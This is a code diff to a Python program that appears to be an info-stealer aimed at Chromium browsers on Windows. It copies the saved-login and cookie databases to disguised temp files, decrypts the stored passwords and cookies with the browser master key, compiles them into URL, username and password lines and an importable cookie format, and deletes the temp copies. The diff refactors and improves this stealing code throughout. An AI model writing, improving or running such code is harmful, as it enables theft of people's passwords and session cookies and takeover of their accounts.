@@ -36,60 +36,47 @@ def get_master_key(path: str):
     
     return master_key
 
-def decrypt_payload(cipher, payload):
-    try:
-        return cipher.decrypt(payload)
-    except:
-        pass
 
-
-def generate_cipher(aes_key, iv):
-    try:
-        return AES.new(aes_key, AES.MODE_GCM, iv)
-    except:
-        pass
-
-
-def decrypt_password(buff, master_key):
+def decrypt_password(buff: bytes, master_key: bytes) -> str:
     try:
         iv = buff[3:15]
         payload = buff[15:]
-        cipher = generate_cipher(master_key, iv)
-        decrypted_pass = decrypt_payload(cipher, payload)
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
         decrypted_pass = decrypted_pass[:-16].decode()  
         return decrypted_pass
     except:
-        return "Chrome < 80"    
+        return "FAILED_TO_GET_MASTER_KEY"
 
 
 def get_login_data(path, master_key, blink = False):
+    try:
+        global logins
+        if not blink:
+            num = path.rfind("\\")
+            profile = path[num+1:]
+            logins += f"===============================\n\n\n{profile}:\n\n"
+        login_db = f'{path}\\Login Data'
+        copy2(login_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db') 
+        conn = connect(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
+        cursor = conn.cursor()
+
+    
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(encrypted_password, master_key)
+
+            alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
+            logins += alldatapass
         try:
-            global logins
-            if not blink:
-                num = path.rfind("\\")
-                profile = path[num+1:]
-                logins += f"===============================\n\n\n{profile}:\n\n"
-            login_db = f'{path}\\Login Data'
-            copy2(login_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db') 
-            conn = connect(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
-            cursor = conn.cursor()
-
-        
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = decrypt_password(encrypted_password, master_key)
-
-                alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
-                logins += alldatapass
-            try:
-                remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
-            except:
-                pass
-        except Exception as e:
-            Log(f"{path} logins ---> {e}")
+            remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
+        except:
+            pass
+    except Exception as e:
+        Log(f"{path} logins ---> {e}")
 
 def time(date):
     try:
@@ -154,6 +141,20 @@ Local Path: {row[1]}
         Log(f"{path} downhistory ---> {e}")
 
 def get_cookies(path, master_key, blink = False):
+    class Cookie:
+        def __init__(self, host, name, path, value, expires):
+            self.host = host
+            self.name = name
+            self.path = path
+            self.value = value
+            self.expires = expires
+
+        def __str__(self):
+            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'
+
+        def __repr__(self):
+            return self.__str__()
+        
     try:
         global cookies
         if not blink:
@@ -166,14 +167,14 @@ def get_cookies(path, master_key, blink = False):
         copy2(cookie_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\cwincache.db')
         conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
         cursor = conn.cursor()
-        cursor.execute("SELECT host_key, path, datetime(expires_utc/1000000,'unixepoch') as expires_utc, name, encrypted_value FROM cookies")
+        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
         for row in cursor.fetchall():
             if not all(row[:4]):
                 continue
 
-            cookie_value = decrypt_password(row[4], master_key)
-            cookie_line = f"{row[0]}\tTRUE\t{row[2]}\tFALSE\t{row[4]}\t{row[1]}\t{cookie_value}"
-            cookies += cookie_line + "\n\n"
+            cookie_value = decrypt_password(row[3], master_key)
+            cookie_line = str(Cookie(row[0], row[1], row[2], cookie_value, row[4]))
+            cookies += cookie_line + "\n"
         conn.close()
         try:
             remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
